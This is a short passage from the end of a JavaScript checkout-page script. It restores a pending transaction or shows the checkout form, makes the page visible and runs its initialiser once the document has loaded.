            }
        } else {
            if (!tryRestoreTransaction()) {
                showCheckoutForm();
            }
        }

        document.body.style.visibility = 'visible';
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();